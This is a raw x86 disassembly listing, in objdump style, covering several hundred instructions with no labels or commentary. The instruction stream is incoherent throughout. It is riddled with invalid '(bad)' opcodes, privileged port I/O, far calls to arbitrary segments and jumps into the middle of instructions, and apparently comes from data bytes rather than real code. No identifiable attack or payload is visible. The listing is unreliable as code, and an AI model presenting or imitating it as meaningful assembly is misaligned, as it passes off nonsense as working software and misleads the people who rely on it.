  420506:	loope  0x42048b
  420508:	sbb    edx,edx
  42050a:	cmp    BYTE PTR [edx-0x658dd25c],0x17
  420511:	ds (bad) 
  420514:	in     al,0xe5
  420516:	jg     0x42052c
  420518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420519:	aam    0x47
  42051b:	push   ebp
  42051c:	std    
  42051d:	jecxz  0x42055f
  42051f:	lods   eax,DWORD PTR ds:[esi]
  420520:	dec    eax
  420521:	jge    0x4204bc
  420523:	xchg   esi,eax
  420524:	jp     0x42056d
  420526:	push   edx
  420527:	out    dx,eax
  420528:	push   edx
  420529:	outs   dx,BYTE PTR ds:[esi]
  42052a:	xchg   esp,eax
  42052b:	shr    ecx,1
  42052d:	stc    
  42052e:	cmp    esi,DWORD PTR [ecx+0x1]
  420531:	ret    0x6d0d
  420534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420535:	mov    eax,0x1f6fd0ca
  42053a:	jecxz  0x4204d8
  42053c:	add    ebp,DWORD PTR [edx-0x37]
  42053f:	mov    ah,0xe2
  420541:	sub    DWORD PTR [edi+0xf],ecx
  420544:	hlt    
  420545:	ins    BYTE PTR es:[edi],dx
  420546:	lods   eax,DWORD PTR ds:[esi]
  420547:	push   0x4898416f
  42054c:	mov    esp,?
  42054e:	dec    esi
  42054f:	enter  0x97d0,0xdf
  420553:	(bad)  
  420554:	jge    0x42051a
  420556:	push   cs
  420557:	test   DWORD PTR ds:0x504bdfc,edi
  42055d:	aaa    
  42055e:	pop    ebp
  42055f:	ja     0x420565
  420561:	jl     0x4204fa
  420563:	cmp    DWORD PTR [ecx+0x70],esi
  420566:	pop    ecx
  420567:	out    0x2e,al
  420569:	ficomp WORD PTR [edi]
  42056b:	mov    ds:0xd07250a5,al
  420570:	mov    eax,0x8730def5
  420575:	ja     0x420542
  420577:	idiv   DWORD PTR [eax]
  420579:	jecxz  0x42056b
  42057b:	and    al,0xce
  42057d:	lods   eax,DWORD PTR ds:[esi]
  42057e:	sub    eax,edi
  420580:	sbb    BYTE PTR [esi],bl
  420582:	dec    ecx
  420583:	xor    dh,BYTE PTR [ebp-0x5410cda]
  420589:	(bad)  
  42058a:	push   esi
  42058b:	scas   eax,DWORD PTR es:[edi]
  42058c:	and    al,0xe7
  42058e:	xchg   esi,eax
  42058f:	xchg   ebp,eax
  420590:	push   esp
  420591:	retf   
  420592:	sub    ebp,esi
  420594:	test   DWORD PTR [edi-0x607e7c31],ebp
  42059a:	dec    ebp
  42059b:	jge    0x4205ab
  42059d:	cmp    DWORD PTR [esp+edi*1-0x7c],0x71b98646
  4205a5:	addr16 pop ecx
  4205a7:	rcr    edi,1
  4205a9:	out    0xc4,eax
  4205ab:	cmp    BYTE PTR [ebp-0x5b8199c6],ah
  4205b1:	adc    ebx,DWORD PTR ds:0x83af06ef
  4205b7:	mov    ah,0xc8
  4205b9:	(bad)  
  4205ba:	pop    esi
  4205bb:	(bad)  
  4205bc:	mov    ecx,DWORD PTR [edx]
  4205be:	or     edx,esp
  4205c0:	dec    esp
  4205c1:	mov    cl,0x17
  4205c3:	ins    BYTE PTR es:[edi],dx
  4205c4:	dec    ebx
  4205c5:	test   DWORD PTR [eax],edx
  4205c7:	int3   
  4205c8:	fld    TBYTE PTR [ebx]
  4205ca:	stos   BYTE PTR es:[edi],al
  4205cb:	push   edx
  4205cc:	xor    edx,ebp
  4205ce:	sub    ah,BYTE PTR [eax]
  4205d0:	outs   dx,BYTE PTR ds:[esi]
  4205d1:	pop    ebp
  4205d2:	and    BYTE PTR [ebx+edx*1-0x1f],bh
  4205d6:	push   ds
  4205d7:	in     al,0x1d
  4205d9:	dec    edi
  4205da:	fisub  DWORD PTR [eax]
  4205dc:	(bad)  
  4205dd:	cli    
  4205de:	int    0xfa
  4205e0:	sar    BYTE PTR [ebp-0x2f67f44d],1
  4205e6:	jmp    0x4205ea
  4205e8:	inc    ebp
  4205e9:	pop    ebp
  4205ea:	or     esi,ebx
  4205ec:	call   0x5c45:0x88511ddf
  4205f3:	push   es
  4205f4:	icebp  
  4205f5:	in     eax,dx
  4205f6:	sbb    dl,al
  4205f8:	xchg   esi,eax
  4205f9:	popa   
  4205fa:	jmp    0x4205c6
  4205fc:	mov    al,ds:0x90ea0608
  420601:	pushf  
  420602:	mov    DWORD PTR [edi+0x3a9442c6],ebx
  420608:	ja     0x420647
  42060a:	pop    es
  42060b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42060c:	xchg   ebp,eax
  42060d:	mov    ah,0x9c
  42060f:	mov    ch,0xa0
  420611:	xchg   esi,eax
  420612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420613:	ret    0x1eea
  420616:	mov    esi,0x68cf568
  42061b:	lahf   
  42061c:	in     al,dx
  42061d:	xchg   ebp,eax
  42061e:	sbb    ebx,esi
  420620:	call   0x441f:0xadaa4ebe
  420627:	cmp    ebp,DWORD PTR [ebp-0x69240354]
  42062d:	iret   
  42062e:	cmp    esi,0xd6381ccf
  420634:	xor    al,0x5
  420636:	push   cs
  420637:	addr16 add bh,cl
  42063a:	lds    ecx,FWORD PTR [eax]
  42063c:	loopne 0x420671
  42063e:	or     esi,DWORD PTR [eax-0x50544e58]
  420644:	mov    al,0xa6
  420646:	and    ecx,DWORD PTR [eax-0x31b5931c]
  42064c:	mov    ds:0x968ea11c,al
  420651:	add    al,dl
  420653:	jp     0x42069f
  420655:	mov    dh,0x2a
  420657:	ja     0x4206a9
  420659:	mov    ds,eax
  42065b:	sbb    al,BYTE PTR [eax+0x44]
  42065e:	stc    
  42065f:	mov    edi,ebp
  420661:	into   
  420662:	shl    DWORD PTR [ecx],cl
  420664:	adc    cl,ah
  420666:	and    BYTE PTR [ebx-0x3b],ch
  420669:	push   es
  42066a:	xchg   DWORD PTR es:[esi+eax*2],esp
  42066e:	pusha  
  42066f:	sbb    ecx,DWORD PTR [ecx+eiz*2-0x2d2bd8af]
  420676:	repz daa 
  420678:	std    
  420679:	mov    eax,ds:0x384cac7
  42067e:	or     esi,DWORD PTR [ebx]
  420680:	push   ds
  420681:	arpl   WORD PTR [ebp+0x3a],si
  420684:	push   edx
  420685:	je     0x4206d5
  420687:	lock push esp
  420689:	out    0x91,eax
  42068b:	jbe    0x4206c1
  42068d:	cld    
  42068e:	inc    esp
  42068f:	retf   
  420690:	or     dl,dl
  420692:	gs or  al,0x12
  420695:	es push 0x651a871f
  42069b:	mov    ds:0xaa0a0b04,al
  4206a0:	add    eax,0x35a299fd
  4206a5:	pop    ss
  4206a6:	lea    esi,[edi+ebp*8-0x7f]
  4206aa:	add    bh,cl
  4206ac:	cmp    al,0xb
  4206ae:	adc    ebx,edx
  4206b0:	cld    
  4206b1:	jb     0x420710
  4206b3:	xor    bh,dh
  4206b5:	bound  edx,QWORD PTR [edx+0xb]
  4206b8:	cwde   
  4206b9:	sub    BYTE PTR [edx-0x15],dl
  4206bc:	adc    eax,0xb9354719
  4206c1:	in     al,dx
  4206c2:	sbb    dh,cl
  4206c4:	add    BYTE PTR [ebx-0x3a],ch
  4206c7:	jb     0x420685
  4206c9:	fsubr  QWORD PTR [ebx-0x6]
  4206cc:	fsubr  st,st(4)
  4206ce:	in     al,0xdb
  4206d0:	jns    0x4206ab
  4206d2:	fdiv   DWORD PTR [eax+0x5f]
  4206d5:	imul   eax,edx,0x34dfbcfa
  4206db:	test   eax,eax
  4206dd:	out    dx,eax
  4206de:	xchg   esp,eax
  4206df:	aad    0xe5
  4206e1:	std    
  4206e2:	imul   ecx,DWORD PTR [esi-0x581bd6c5],0xf63d403f
  4206ec:	adc    cl,BYTE PTR [ecx]
  4206ee:	xor    BYTE PTR [esi+0x11],0xb7
  4206f2:	xor    ecx,DWORD PTR ds:0xd961ba49
  4206f8:	sbb    al,dl
  4206fa:	sbb    cl,bh
  4206fc:	xchg   ebx,eax
  4206fd:	data16 aaa 
  4206ff:	retf   0x758c
  420702:	bound  eax,QWORD PTR [eax]
  420704:	dec    dl
  420706:	pop    ds
  420707:	mov    ds:0xe54dc832,eax
  42070c:	add    DWORD PTR [ecx-0xbe8c2d5],edx
  420712:	and    eax,0x9e7bd84
  420717:	int    0xba
  420719:	or     edx,DWORD PTR [edx-0x47]
  42071c:	iret   
  42071d:	xchg   esi,eax
  42071e:	aas    
  42071f:	jmp    0xb9ce:0xed0c0e5f
  420726:	test   BYTE PTR [esi-0x54051a06],al
  42072c:	int3   
  42072d:	fimul  DWORD PTR [ebx+ebp*4-0x6dac8606]
  420734:	push   es
  420735:	outs   dx,DWORD PTR cs:[esi]
  420737:	sar    bh,0xda
  42073a:	test   al,0xee
  42073c:	xchg   ebp,eax
  42073d:	mov    ch,0x3
  42073f:	movaps XMMWORD PTR [ebp+esi*8-0x3b],xmm0
  420744:	or     edi,DWORD PTR [ecx-0x4a]
  420747:	aam    0xc8
  420749:	aas    
  42074a:	stos   BYTE PTR es:[edi],al
  42074b:	out    0xc4,al
  42074d:	cld    
  42074e:	and    BYTE PTR [ecx+esi*8],ch
  420751:	pop    es
  420752:	out    0xc4,al
  420754:	test   BYTE PTR [ecx],al
  420756:	mov    DWORD PTR [esi+0x6b],ecx
  420759:	inc    esp
  42075a:	jge    0x420753
  42075c:	and    bl,BYTE PTR [ecx-0x75]
  42075f:	pop    es
  420760:	push   cs
  420761:	xlat   BYTE PTR ds:[ebx]
  420762:	(bad)  [eax]
  420764:	cmp    DWORD PTR [eax+0x5639516],edx
  42076a:	add    DWORD PTR [eax+esi*1-0x2c],0xb0d23885
  420772:	cmp    cl,dh
  420774:	(bad)  
  420775:	in     eax,dx
  420776:	leave  
  420777:	adc    BYTE PTR [edx],bl
  420779:	mov    al,dh
  42077b:	sbb    esp,DWORD PTR [ebp-0x3eabca96]
  420781:	adc    BYTE PTR [eax+0x6d64fecf],0x5
  420788:	mov    WORD PTR [eax],?
  42078a:	mov    eax,ds:0x4bbb63ef
  42078f:	bound  eax,QWORD PTR [esi]
  420791:	and    ebx,DWORD PTR [edx+0x77]
  420794:	mov    ds:0x8ef16b47,eax
  420799:	dec    ebp
  42079a:	mov    eax,0x8c5b78d9
  42079f:	icebp  
  4207a0:	jo     0x42072d
  4207a2:	cdq    
  4207a3:	js     0x4207ba
  4207a5:	pop    es
  4207a6:	addr16 pop ds
  4207a8:	cmp    cl,BYTE PTR [edx]
  4207aa:	push   0x3f233ce8
  4207af:	repnz popa 
  4207b1:	adc    ah,BYTE PTR [ebp+0x44fc5509]
  4207b7:	loopne 0x4207d8
  4207b9:	push   0x3
  4207bb:	in     al,dx
  4207bc:	stos   BYTE PTR es:[edi],al
  4207bd:	jns    0x4207db
  4207bf:	iret   
  4207c0:	sar    BYTE PTR [eax],1
  4207c2:	xor    eax,0x84ee1b27
  4207c7:	lods   eax,DWORD PTR ds:[esi]
  4207c8:	add    al,BYTE PTR [esp+ebp*4+0x7b]
  4207cc:	xlat   BYTE PTR ds:[ebx]
  4207cd:	adc    al,0x25
  4207cf:	out    0xfc,eax
  4207d1:	add    bh,BYTE PTR [edx-0x29]
  4207d4:	in     al,dx
  4207d5:	outs   dx,DWORD PTR ds:[esi]
  4207d6:	mov    WORD PTR [eax-0x5a495c57],ss
  4207dc:	sub    DWORD PTR [edx-0x72e4c53c],0x5f3d897e
  4207e6:	mov    ecx,0x67f2d6a7
  4207eb:	out    dx,eax
  4207ec:	jg     0x420863
  4207ee:	out    dx,eax
  4207ef:	into   
  4207f0:	cmp    al,0x4e
  4207f2:	mov    dh,0xc2
  4207f4:	call   0x9bcd9961
  4207f9:	pop    eax
  4207fa:	scas   al,BYTE PTR es:[edi]
  4207fb:	fld    QWORD PTR [edi]
  4207fd:	pop    ebp
  4207fe:	out    0xa1,eax
  420800:	mov    BYTE PTR [edi+edx*8],dl
  420803:	xchg   edx,eax
  420804:	mov    ecx,0xe5f6272b
  420809:	div    DWORD PTR [esi+0x316b0605]
  42080f:	dec    esp
  420810:	loope  0x4207aa
  420812:	jo     0x4207a6
  420814:	adc    al,BYTE PTR [edi+eiz*8+0xee48368]
  42081b:	sub    BYTE PTR [eax+0x54033fdc],ah
  420821:	mov    ch,0x1
  420823:	cmp    DWORD PTR [edx],edi
  420825:	outs   dx,BYTE PTR ds:[esi]
  420826:	cs (bad) 
  420828:	aaa    
  420829:	stos   BYTE PTR es:[edi],al
  42082a:	scas   eax,DWORD PTR es:[edi]
  42082b:	loope  0x420847
  42082d:	xchg   ebp,ebp
  42082f:	push   ecx
  420830:	scas   al,BYTE PTR es:[edi]
  420831:	add    ch,bl
  420833:	xchg   DWORD PTR [ebx+0x18],ecx
  420836:	fild   WORD PTR [edi-0x1f]
  420839:	in     al,0x75
  42083b:	mov    edi,0x36bc704c
  420840:	test   DWORD PTR [edi-0x29],0xe90d391f
  420847:	inc    esi
  420848:	fisttp WORD PTR [ebp+0x20ee0eb3]
  42084e:	cwde   
  42084f:	loopne 0x4207d7
  420851:	arpl   WORD PTR [eax+0x65],cx
  420854:	popf   
  420855:	daa    
  420856:	mov    eax,ds:0xdd8657ab
  42085b:	sahf   
  42085c:	in     al,0xb0
  42085e:	loope  0x4208a3
  420860:	bswap  esi
  420862:	hlt    
  420863:	mov    eax,0xd4a1af49
  420868:	mov    esi,0x9007a3c3
  42086d:	lock fcom QWORD PTR [ebp-0x3553defd]
  420874:	inc    ecx
  420875:	push   ds
  420876:	inc    edi
  420877:	xchg   edx,eax
  420878:	inc    edx
  420879:	lahf   
  42087a:	cmp    DWORD PTR [ebp+0x538e9e6a],esi
  420880:	jae    0x42080d
  420882:	fild   DWORD PTR [ecx-0x6e]
  420885:	and    al,0x2e
  420887:	sub    BYTE PTR [edx],al
  420889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42088a:	ja     0x42090b
  42088c:	imul   esp,DWORD PTR [eax-0x4f],0x8a8cb6c8
  420893:	fsubr  st,st(6)
  420895:	fwait
  420896:	push   ds
  420897:	repnz (bad) 
  42089a:	cmp    DWORD PTR [edi+0x37],esp
  42089d:	imul   edx,DWORD PTR [eax+0xf],0xa48b0f98
  4208a4:	sbb    al,0x92
  4208a6:	ss pop ecx
  4208a8:	pop    ds
  4208a9:	lods   al,BYTE PTR ds:[esi]
  4208aa:	push   0xefb69815
  4208af:	fwait
  4208b0:	(bad)  
  4208b1:	mov    DWORD PTR [edx-0x12],edx
  4208b4:	mov    ecx,0x38212562
  4208b9:	fdivr  QWORD PTR [ebx-0x2dd5bce5]
  4208bf:	dec    esi
  4208c0:	shr    DWORD PTR [eax],cl
  4208c2:	fwait
  4208c3:	jne    0x4208f2
  4208c5:	push   es
  4208c6:	lds    ebp,FWORD PTR [eax+0xf]
  4208c9:	push   cs
  4208ca:	lods   al,BYTE PTR ds:[esi]
  4208cb:	jecxz  0x42087c
  4208cd:	fidivr DWORD PTR [esi+ebx*4-0x57e787f5]
  4208d4:	cmp    edx,DWORD PTR [eax]
  4208d6:	add    eax,DWORD PTR [esi-0x2be6f800]
  4208dc:	loop   0x4208f5
  4208de:	xchg   DWORD PTR [eax*1+0x5582512c],edx
  4208e5:	dec    ebx
  4208e6:	jecxz  0x420876
  4208e8:	ins    DWORD PTR es:[edi],dx
  4208e9:	or     BYTE PTR [esi-0x63055fae],al
  4208ef:	adc    ah,dl
  4208f1:	in     al,0xcc
  4208f3:	cmp    ebx,DWORD PTR ss:[eax]
  4208f6:	lds    ecx,FWORD PTR [edi-0x70]
  4208f9:	imul   edi,DWORD PTR [ebp+0x1e],0xffffff80
  4208fd:	jbe    0x4208e1
  4208ff:	sbb    al,BYTE PTR [ebx+0x41ef548a]
  420905:	jp     0x420931
  420907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420908:	pop    ds
  420909:	push   es
  42090a:	jl     0x4208f5
  42090c:	fild   DWORD PTR [ecx+ecx*1]
  42090f:	adc    bl,ah
  420911:	clc    
  420912:	fisttp QWORD PTR [edi-0x562530b7]
  420918:	scas   eax,DWORD PTR es:[edi]
  420919:	add    al,ch
  42091b:	rol    BYTE PTR [edx+edx*1],0x5
  42091f:	popf   
  420920:	outs   dx,DWORD PTR ds:[esi]
  420921:	xor    ebp,DWORD PTR [edx+0x1a]
  420924:	jmp    0xfe5fa2af
  420929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42092a:	in     eax,dx
  42092b:	push   cs
  42092c:	pop    ss
  42092d:	xor    cl,bh
  42092f:	das    
  420930:	adc    al,0x6a
  420932:	shr    DWORD PTR [edx-0x30],1
  420935:	push   0x10
  420937:	mov    ebx,0xb4da8a67
  42093c:	xor    al,0x1b
  42093e:	cmp    cl,cl
  420940:	dec    eax
  420941:	fwait
  420942:	mov    DWORD PTR [ebp+0x45],eax
  420945:	mov    eax,ds:0xa799e141
  42094a:	mov    ss,WORD PTR [ecx]
  42094c:	ret    
  42094d:	xchg   BYTE PTR [ebp+0x3ab2cc16],dh
  420953:	aad    0xe9
  420955:	in     al,0xe2
  420957:	adc    ebx,DWORD PTR [ebx+ebp*2+0x7f]
  42095b:	ja     0x420980
  42095d:	ins    DWORD PTR es:[edi],dx
  42095e:	mov    eax,0x3735db83
  420963:	cmp    al,0x8c
  420965:	sti    
  420966:	and    eax,0x64bccee9
  42096b:	(bad)  
  42096c:	jmp    0x4208fc
  42096e:	mov    bh,0x47
  420970:	pop    esp
  420971:	push   ebx
  420972:	mov    al,0xbc
  420974:	arpl   WORD PTR [edx-0x72],ax
  420977:	fcom   QWORD PTR [ecx+0x2d9d7df9]
  42097d:	sbb    bh,BYTE PTR ds:0x8a8a1a84
  420983:	sub    ebp,DWORD PTR [esi-0x16aebe16]
  420989:	push   edi
  42098a:	cmp    BYTE PTR [eax-0x22],bl
  42098d:	inc    eax
  42098e:	sbb    al,0xfd
  420990:	inc    edx
  420991:	out    dx,eax
  420992:	pop    eax
  420993:	addr16 inc eax
  420995:	mov    al,ds:0xe95421a8
  42099a:	push   esi
  42099b:	aam    0x5b
  42099d:	aam    0x12
  42099f:	out    dx,eax
  4209a0:	out    0x43,eax
  4209a2:	or     DWORD PTR [edx-0x68],ebp
  4209a5:	or     dl,dl
  4209a7:	mov    ch,0x43
  4209a9:	push   ecx
  4209aa:	out    0xf7,al
  4209ac:	jo     0x420a21
  4209ae:	cmp    DWORD PTR [ebx-0x4c],esp
  4209b1:	pcmpeqd mm7,QWORD PTR [edi+0x42]
  4209b5:	inc    edx
  4209b6:	sbb    BYTE PTR [edi],al
  4209b8:	fistp  WORD PTR [edx+0x2149a5a7]
  4209be:	in     eax,dx
  4209bf:	nop
  4209c0:	or     ecx,DWORD PTR [ecx+0x701c158c]
  4209c6:	jae    0x420a2f
  4209c8:	ror    DWORD PTR [ebp+0x4e],cl
  4209cb:	in     eax,0x7b
  4209cd:	addr16 pushf 
  4209cf:	fcomp  st(5)
  4209d1:	xchg   esi,eax
  4209d2:	jo     0x420985
  4209d4:	sub    eax,0xb7238d39
  4209d9:	inc    edi
  4209da:	je     0x4209c8
  4209dc:	add    cl,BYTE PTR [edi-0x7fb31efb]
  4209e2:	dec    eax
  4209e3:	aaa    
  4209e4:	adc    al,0xc
  4209e6:	std    
  4209e7:	push   0xffffffa6
  4209e9:	cld    
  4209ea:	sbb    DWORD PTR [edi-0x42],0xe8b37317
  4209f1:	test   DWORD PTR [ebx],esp
  4209f3:	xchg   BYTE PTR [ebp-0x3fbc1f56],ah
  4209f9:	in     eax,dx
  4209fa:	out    0xa4,al
  4209fc:	and    esi,DWORD PTR [edi+ecx*2-0x40]
  420a00:	lahf   
  420a01:	xor    bl,BYTE PTR [ecx]
  420a03:	and    esi,edx
  420a05:	sub    al,0x7d
  420a07:	mov    dl,0x8e
  420a09:	xchg   DWORD PTR [edx-0x74],ebx
  420a0c:	jnp    0x42099a
  420a0e:	js     0x4209f7
  420a10:	push   eax
  420a11:	dec    edi
  420a12:	and    BYTE PTR [eax+0x7872e0d2],dh
  420a18:	stos   BYTE PTR es:[edi],al
  420a19:	xlat   BYTE PTR ds:[ebx]
  420a1a:	mov    esp,0x2fcc999b
  420a1f:	pcmpgtb mm1,QWORD PTR [ebx]
  420a22:	mov    esp,0x23f25f95
  420a27:	mov    edx,0xa2e5760
  420a2c:	test   eax,0x5bf9700d
  420a31:	shl    BYTE PTR [ebx-0x1b],1
  420a34:	sbb    edx,DWORD PTR [eax+0xe]
  420a37:	mov    al,ds:0xc0e69011
  420a3c:	in     eax,dx
  420a3d:	mov    edx,0xf4e1c53e
  420a42:	inc    esi
  420a43:	(bad)  
  420a44:	rcl    BYTE PTR [esi],cl
  420a46:	loope  0x420a77
  420a48:	fs scas eax,DWORD PTR es:[edi]
  420a4a:	popa   
  420a4b:	int    0x4d
  420a4d:	push   ss
  420a4e:	in     eax,dx
  420a4f:	cmp    BYTE PTR [ebp+0x14],dh
  420a52:	mov    BYTE PTR [edx],dl
  420a54:	retf   
  420a55:	mov    WORD PTR ds:0xd7b78c32,gs
  420a5b:	xor    DWORD PTR [esi+0x21299f7e],0x3cb1a0c
  420a65:	jg     0x420ab8
  420a67:	das    
  420a68:	xor    BYTE PTR [ecx],cl
  420a6a:	cs call 0x716d:0xc76b7800
  420a72:	sar    DWORD PTR [ebx-0x42],cl
  420a75:	in     eax,0x6e
  420a77:	popa   
  420a78:	mov    eax,ds:0x8e38427
  420a7d:	jmp    FWORD PTR [eax]
  420a7f:	push   es
  420a80:	sar    esi,1
  420a82:	pusha  
  420a83:	jl     0x420a42
  420a85:	cmp    ebp,DWORD PTR [ebp-0x1a]
  420a88:	outs   dx,DWORD PTR ds:[esi]
  420a89:	mov    dh,0x70
  420a8b:	and    BYTE PTR [ebp+ebx*1-0x7ba36611],bl
  420a92:	adc    eax,DWORD PTR [eax-0x7a718653]
  420a98:	lea    ebp,[ebp-0x7d]
  420a9b:	cli    
  420a9c:	xor    BYTE PTR ds:[esi+0x40],dl
  420aa0:	clc    
  420aa1:	fcomp  QWORD PTR [esi]
  420aa3:	push   0x54010f4a
  420aa8:	add    BYTE PTR [edi-0x76],0xee
  420aac:	jbe    0x420ad6
  420aae:	loop   0x420a42
  420ab0:	icebp  
  420ab1:	push   esp
  420ab2:	inc    ebx
  420ab3:	xor    al,0x79
  420ab5:	ja     0x420a48
  420ab7:	sahf   
  420ab8:	(bad)  
  420ab9:	in     al,0x1e
  420abb:	adc    BYTE PTR [edi+0x6ac30b70],cl
  420ac1:	push   ebp
  420ac2:	mov    edi,eax
  420ac4:	mov    ebx,0x8c25d911
  420ac9:	inc    esi
  420aca:	sub    dl,BYTE PTR [edx]
  420acc:	rcr    BYTE PTR [ebx+0x4dfabb10],cl
  420ad2:	cwde   
  420ad3:	xor    eax,0x488cdc09
  420ad8:	sbb    ch,BYTE PTR [eax+ecx*1+0x32]
  420adc:	pop    esi
  420add:	xchg   ecx,eax
  420ade:	gs leave 
  420ae0:	inc    eax
  420ae1:	dec    esp
  420ae2:	sbb    eax,0x6789b69c
  420ae7:	pushf  
  420ae8:	sbb    dh,0x82
  420aeb:	test   DWORD PTR [ebp+0x64536e5],ecx
  420af1:	jmp    0x420b21
  420af3:	cs icebp 
  420af5:	and    al,0xb3
  420af7:	fwait
  420af8:	jg     0x420b48
  420afa:	push   es
  420afb:	adc    esp,eax
  420afd:	jbe    0x420b2e
  420aff:	ror    BYTE PTR [ebp+eiz*8+0x18],0xf8
  420b04:	xchg   ecx,eax
  420b05:	jbe    0x420aa6
  420b07:	fwait
  420b08:	mov    ebp,0x48781907
  420b0d:	jae    0x420ac7
  420b0f:	out    0xdf,eax
  420b11:	mov    dl,0xb4
  420b13:	cmp    eax,0x7333e57c
  420b18:	sub    ecx,DWORD PTR [eax-0x4f]
  420b1b:	hlt    
  420b1c:	mov    ecx,0xe22b2b02
  420b21:	retf   0x2450
  420b24:	inc    esi
  420b25:	ret    
  420b26:	xchg   BYTE PTR [ebp-0x3169135c],dl
  420b2c:	pop    esp
  420b2d:	mov    ds:0x89c60316,eax
  420b32:	daa    
  420b33:	cli    
  420b34:	sub    ebx,ebx
  420b36:	mov    ch,0x2e
  420b38:	cmp    eax,DWORD PTR fs:[ecx-0x2b305340]
  420b3f:	dec    ebp
  420b40:	in     eax,0xe1
  420b42:	adc    BYTE PTR [ecx-0x74d3d23b],ah
  420b48:	dec    esp
  420b49:	jmp    0x420bb1
  420b4b:	adc    ecx,DWORD PTR ds:0x267b90f0
  420b51:	adc    DWORD PTR [edi],esp
  420b53:	xor    BYTE PTR [ebp+0x7837fdc9],ch
  420b59:	jae    0x420b46
  420b5b:	imul   ecx,esi,0xad89b960
  420b61:	jbe    0x420bcb
  420b63:	rol    DWORD PTR [ecx-0x6383265c],cl
  420b69:	shl    BYTE PTR ds:0x4864de6,cl
  420b6f:	cmp    bl,bh
  420b71:	xchg   esp,eax
  420b72:	inc    ebx
  420b73:	sbb    BYTE PTR [edi-0x6],0xfd
  420b77:	loope  0x420b8b
  420b79:	fld    st(0)
  420b7b:	xlat   BYTE PTR ds:[ebx]
  420b7c:	repnz (bad)
  420b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b80:	or     al,0x3e
  420b82:	imul   ecx,DWORD PTR [edi-0x2e],0x35
  420b86:	int    0x71
  420b88:	mov    BYTE PTR [edx+0x2f],0x5c
  420b8c:	rol    BYTE PTR [esi],1
  420b8e:	add    edi,esi
  420b90:	xchg   ecx,eax
  420b91:	iret   
  420b92:	or     esp,DWORD PTR [ecx-0xce5648a]
  420b98:	ss pusha 
  420b9a:	pop    ds
  420b9b:	dec    ebx
  420b9c:	je     0x420b76
  420b9e:	fcom   DWORD PTR [eax-0x608ca2a8]
  420ba4:	nop
  420ba5:	fist   WORD PTR [ebx-0x1e038c87]
  420bab:	sbb    al,0x42
  420bad:	mov    esp,0xf92c028e
  420bb2:	cmp    al,0xf4
  420bb4:	call   0x5eb0:0x1cabccc8
  420bbb:	sub    eax,0x93716332
  420bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bc1:	add    DWORD PTR [ecx],edx
  420bc3:	call   0x6970762d
  420bc8:	leave  
  420bc9:	or     BYTE PTR [ebp+0x5c],ah
  420bcc:	test   al,0x72
  420bce:	repz xor cl,BYTE PTR [bx+di+0x35c7]
  420bd4:	pop    ebp
  420bd5:	call   0xada3ec7b
  420bda:	retf   
  420bdb:	jbe    0x420be0
  420bdd:	jp     0x420bfb
  420bdf:	fnsave [eax]
  420be1:	ss stc 
  420be3:	hlt    
  420be4:	into   
  420be5:	loope  0x420bc1
  420be7:	cmp    DWORD PTR [esi+0x7dfab060],ecx
  420bed:	and    ch,dl
  420bef:	dec    edi
  420bf0:	imul   al
  420bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bf3:	mov    ebx,0x5aa2665b
  420bf8:	and    eax,0x3a777649
  420bfd:	adc    al,0x5f
  420bff:	fsub   DWORD PTR [ecx+0x18]
  420c02:	mov    edx,0x286aa2db
  420c07:	mov    esi,0xf9144a81
  420c0c:	shl    BYTE PTR [edx-0x716fba69],0xef
  420c13:	dec    eax
  420c14:	popa   
  420c15:	int3   
  420c16:	aas    
  420c17:	not    BYTE PTR [esi-0x7d]
  420c1a:	inc    edx
  420c1b:	data16 out dx,al
  420c1d:	push   ecx
  420c1e:	cmp    esi,esp
  420c20:	repz mov bl,0x24
  420c23:	inc    ecx
  420c24:	cli    
  420c25:	sbb    bl,BYTE PTR [eax+0x4f]
  420c28:	sbb    DWORD PTR [edx-0x58],0x1b
  420c2c:	push   ds
  420c2d:	cs mov esi,0xd602d8d
  420c33:	sub    cl,BYTE PTR [ecx]
  420c35:	stc    
  420c36:	lds    edi,FWORD PTR [esi+0x351d627d]
  420c3c:	fdivr  QWORD PTR ds:0x1dfcaec8
  420c42:	push   0x11
  420c44:	mov    ebx,DWORD PTR [edx-0x44d9b6e2]
  420c4a:	arpl   bx,sp
  420c4c:	mov    eax,edx
  420c4e:	and    eax,0x26fbe5ae
  420c53:	imul   ebp,DWORD PTR [eax-0x115de629],0xffffffcd
  420c5a:	cmp    ah,BYTE PTR [eax-0x18]
  420c5d:	retf   0x8d91
  420c60:	jo     0x420c84
  420c62:	outs   dx,DWORD PTR ds:[esi]
  420c63:	push   edx
  420c64:	xchg   ebx,eax
  420c65:	bound  eax,QWORD PTR [edi+0x7e]
  420c68:	in     eax,dx
  420c69:	jp     0x420cd0
  420c6b:	pop    ecx
  420c6c:	adc    DWORD PTR [esi-0x6e4aed67],ebp
  420c72:	dec    ebx
  420c73:	mov    ebx,0x9be251af
  420c78:	fld    QWORD PTR [edx-0x3a]
  420c7b:	imul   esi,DWORD PTR [ebx],0xffffff9a
  420c7e:	sbb    edx,edi
  420c80:	lds    edi,FWORD PTR ds:0xcdf803e8
  420c86:	mov    ebp,0x6bb52803
  420c8b:	mov    ds:0x31198205,al
  420c90:	inc    ecx
  420c91:	hlt    
  420c92:	and    al,0xb8
  420c94:	leave  
  420c95:	adc    DWORD PTR [edx-0x31e8b046],ebx
  420c9b:	mov    al,0x1f
  420c9d:	ja     0x420c8a
  420c9f:	rcl    DWORD PTR [ebx],1
  420ca1:	cmp    eax,0x9f365834
  420ca6:	or     al,0xbe
  420ca8:	ins    DWORD PTR es:[edi],dx
  420ca9:	mov    ds:0x389341a6,eax
  420cae:	cs clc 
  420cb0:	shr    DWORD PTR [ebp-0x4c5f337],cl
  420cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cb7:	sub    al,0x6
  420cb9:	shl    DWORD PTR [bp+si+0xb],1
  420cbd:	ret    
  420cbe:	add    BYTE PTR [esi+0x5afc02fb],bl
  420cc4:	ins    DWORD PTR es:[edi],dx
  420cc5:	loope  0x420d44
  420cc7:	inc    ebp
